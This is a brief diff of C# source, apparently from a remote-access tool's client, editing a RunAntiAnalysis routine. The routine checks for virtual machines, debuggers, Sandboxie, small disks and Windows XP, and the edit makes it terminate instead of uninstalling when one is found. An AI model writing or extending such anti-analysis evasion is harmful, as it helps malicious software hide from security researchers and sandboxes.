@@ -14,8 +14,6 @@ using System.Runtime.InteropServices;
 //       This program is distributed for educational purposes only.
 
 
-
-
 namespace Client.Helper
 {
 
@@ -24,8 +22,7 @@ namespace Client.Helper
         public static void RunAntiAnalysis()
         {
             if (DetectManufacturer() || DetectDebugger() || DetectSandboxie() || IsSmallDisk() || IsXP())
-                //Environment.FailFast(null);
-                new HandleUninstall();
+                Environment.FailFast(null);
         }
 
         private static bool IsSmallDisk()
